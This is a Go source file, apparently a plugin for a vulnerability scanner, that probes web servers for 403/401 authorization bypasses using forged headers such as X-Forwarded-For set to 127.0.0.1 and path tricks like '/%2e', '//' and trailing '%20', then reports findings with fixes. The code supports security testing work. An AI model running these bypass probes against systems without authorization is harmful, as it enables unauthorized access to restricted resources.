package plugins

import (
	"DORM/models"
	"fmt"
	"net/http"
	"time"
)

type Bypass403Plugin struct{}

func (p *Bypass403Plugin) Name() string { return "403/401 Authorization Bypass" }

func (p *Bypass403Plugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Delay to allow Spider to discover forbidden paths asynchronously
	time.Sleep(3 * time.Second)

	var targets []string
	
	// Add standard administrative paths
	targets = append(targets, "/admin", "/administrator", "/private", "/secret", "/wp-admin", "/config")

	// Read from SharedData populated by SpiderPlugin
	key := "forbidden_" + target.IP
	val, ok := models.SharedData.Load(key)
	if ok {
		spiderPaths := val.([]string)
		targets = append(targets, spiderPaths...)
	}

	// Remove duplicates
	uniqueTargets := make(map[string]bool)
	var finalTargets []string
	for _, t := range targets {
		if t == "" || t == "/" {
			continue
		}
		if !uniqueTargets[t] {
			uniqueTargets[t] = true
			finalTargets = append(finalTargets, t)
		}
	}

	client := models.GetClient()

	for _, path := range finalTargets {
		// 1. Baseline Request
		req, _ := http.NewRequest("GET", getURL(target, path), nil)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		origStatus := resp.StatusCode
		resp.Body.Close()

		// If it's already accessible or not found, bypass is irrelevant
		if origStatus != 403 && origStatus != 401 && origStatus != 400 {
			continue
		}

		bypassHeaders := map[string]string{
			"X-Forwarded-For":           "127.0.0.1",
			"X-Originating-IP":          "127.0.0.1",
			"X-Custom-IP-Authorization": "127.0.0.1",
			"X-Remote-IP":               "127.0.0.1",
			"X-Rewrite-URL":             path,
		}

		bypassPaths := []string{
			"/%2e" + path,
			path + "/.",
			"//" + path,
			path + "%20",
		}

		// 2. Test Header Bypasses
		for hName, hVal := range bypassHeaders {
			reqHeader, _ := http.NewRequest("GET", getURL(target, path), nil)
			reqHeader.Header.Set(hName, hVal)
			respHeader, err := client.Do(reqHeader)
			if err == nil {
				if respHeader.StatusCode == 200 || respHeader.StatusCode == 302 {
					respHeader.Body.Close()
					return &models.Vulnerability{
						Target:      target,
						Name:        "HTTP 403/401 Header Bypass",
						Severity:    "HIGH",
						CVSS:        7.2,
						Description: fmt.Sprintf("Bypassed restricted access to '%s' using forged header %s: %s", path, hName, hVal),
						Solution:    "Implement strict authorization checks and do not trust client-controlled routing headers.",
						Reference:   "CWE-285",
					}
				}
				respHeader.Body.Close()
			}
		}

		// 3. Test Path Traversal/Normalization Bypasses
		for _, bPath := range bypassPaths {
			reqPath, _ := http.NewRequest("GET", getURL(target, bPath), nil)
			respPath, err := client.Do(reqPath)
			if err == nil {
				if respPath.StatusCode == 200 || respPath.StatusCode == 302 {
					respPath.Body.Close()
					return &models.Vulnerability{
						Target:      target,
						Name:        "HTTP 403/401 Path Bypass",
						Severity:    "HIGH",
						CVSS:        7.2,
						Description: fmt.Sprintf("Bypassed restricted access to '%s' via path manipulation: '%s'", path, bPath),
						Solution:    "Ensure URL normalization is applied before verifying authorization mapping (e.g. Spring/Nginx inconsistency).",
						Reference:   "CWE-285",
					}
				}
				respPath.Body.Close()
			}
		}
	}

	return nil
}
